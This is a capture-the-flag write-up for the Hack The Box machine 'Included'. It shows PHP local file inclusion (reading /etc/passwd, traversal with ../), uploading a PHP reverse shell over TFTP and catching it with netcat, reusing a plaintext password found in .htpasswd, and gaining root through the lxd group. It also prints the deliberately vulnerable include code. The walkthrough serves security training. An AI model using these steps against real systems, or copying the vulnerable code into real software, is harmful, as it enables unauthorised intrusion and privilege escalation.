# Included

## Enumeration

nmap scan result.

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Included]
└─$ nmap -sC -sV 10.129.135.207
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-06 23:44 JST
Nmap scan report for 10.129.135.207
Host is up (0.24s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.135.207/?file=home.php
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.40 seconds

```

access to port 80 with your browser.

![image-20220107000422633](/home/funa/.config/Typora/typora-user-images/image-20220107000422633.png)

We take a look at the URL we can see that this has automatically changed to `http://{target_IP}/?file=home.php` .

First, let's take a look at how this functionality might work.

```php
if ($_GET['file']) {
 include($_GET['file']);
} else {
 header("Location: http://$_SERVER[HTTP_HOST]/index.php?file=home.php");
}
```

We can easily determine if this is the case by attempting to load a file that we know definitely exists on the system and is readable by all users. One of those files is `/etc/passwd` and to load it, change the `file` parameter from `home.php` to `/etc/passwd` .

This is successful and a list of users is returned.

![image-20220107002040050](/home/funa/.config/Typora/typora-user-images/image-20220107002040050.png)

It is worth nothing that inputting `/etc/passwd` might not always work if the inclusion already specifies a working directory.

For instance, consider the following code.

```php
if ($_GET['file']) {
 include( __DIR__ . $_GET['file']);
} else {
 header("Location: http://$_SERVER[HTTP_HOST]/index.php?file=home.php");
}
```

In this example the `__DIR__` parameter is used to acquire the current working directory that the script is located in (e.g. `/var/www/html `) and then the value of the `file` variable is concatenated at the end. If we were to input `/etc/passwd` the full path would become `/var/www/html/etc/passwd` , which would result in a blank page as there is no such file or folder no the system.

To bypass this restriction we would have to instruct the code to search in previous directory. In such a case, `/etc/passwd` would become `../../../etc/passwd` .

nmap UDP scan result. 

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Included]
└─$ sudo nmap -sU 10.129.135.207                                                                                130 ⨯
[sudo] funa のパスワード:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-07 00:34 JST
Nmap scan report for 10.129.135.207
Host is up (0.24s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp

Nmap done: 1 IP address (1 host up) scanned in 1006.32 seconds

```

## Foothold

We can use one of the many available PHP reverse shells that can be found `/usr/share/webshells/php/php-reverse-shell.php` .

Copy the file and open it with a text editor. Then edit the following lines.

```php
$ip = '127.0.0.1'  // CHANGE THIS
$port = 1234 ;     // CHANGE THIS
```

After acquiring the local IP, change it in the PHP shell and save it. Then we will upload the file to the remote TFTP server.

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Included]
└─$ tftp 10.129.135.207
tftp> put php-reverse-shell.php
Sent 5685 bytes in 3.1 seconds
tftp> quit
```

Now that the file has been uploaded, we need to start a local Netcat listener on the port that we specified in the reverse shell, in order to catch the connection once it initiates.

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Included]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

The default configuration file for tftpd-hpa is `/etc/default/tftpd-hpa` . The default root directory where files will be stored is `/var/lib/tftpboot`.

With this information let's try to load `/var/lib/tftpboot/php-reverse-shell.php`.

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Included]
└─$ nc -lvnp 1234                                                                                                  1 ⨯
listening on [any] 1234 ...
connect to [10.10.14.59] from (UNKNOWN) [10.129.135.207] 34812
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 16:46:22 up  1:52,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The received shell is not fully interactive, however we can make it a bit better by using Python 3.

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@included:/$
```

## Lateral Movement

With access to the system as the `www-data` user we do not have enough privileges to read the user flag, therefore we need to find a way to move laterally to user `mike` who was also found on the `passwd` file. A good place to start our enumeration would be the web server directory as it often contains configuration files that might include passwords.

```bash
www-data@included:/var/www/html$ ls -a
ls -a
.   .htaccess  default.css  fonts.css  images     license.txt
..  .htpasswd  fonts        home.php   index.php
```

The folder contains two interesting hidden files, `.htaccess` and `.htpasswd` file is used to store usernames and passwords for basic authentication of HTTP users. Let's read both files.

```bash
www-data@included:/var/www/html$ cat .htaccess
cat .htaccess
RewriteEngine On
RewriteCond %{THE_REQUEST} ^GET.*index\.php [NC]
RewriteRule (.*?)index\.php/*(.*) /$1$2 [R=301,NE,L]
#<Files index.php>
#AuthType Basic
#AuthUserFile /var/www/html/.htpasswd
#Require valid-user
www-data@included:/var/www/html$ cat .htpasswd
cat .htpasswd
mike:Sheffield19
```

Often times users re-use the same password for multiple services and accounts and compromising one of them might mean that all of thm are compromised.

```bash
www-data@included:/var/www/html$ su mike
su mike
Password: Sheffield19

mike@included:/var/www/html$ whoami
whoami
mike
mike@included:/var/www/html$ id
id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
```

User flag is located in `/home/mike`.

## Privilege Escalation

The next step is escalating to the `root` user in order to gain the highest privileges on the system. Looking at the groups that user Mike is a member of, the `lxd` group is listed.

This is exactly what we need and [this](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) HackTricks page describes the whole exploitation process step by step.

```bash
mike@included:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
~ # ^[[55;5Rwhoami
whoami
root
~ # ^[[55;5Rid
id
uid=0(root) gid=0(root)
~ # ^[[55;5Rcd /mnt/root/root
cd /mnt/root/root
/mnt/root/root # ^[[55;18Rls
ls
root.txt
```

Congratulations!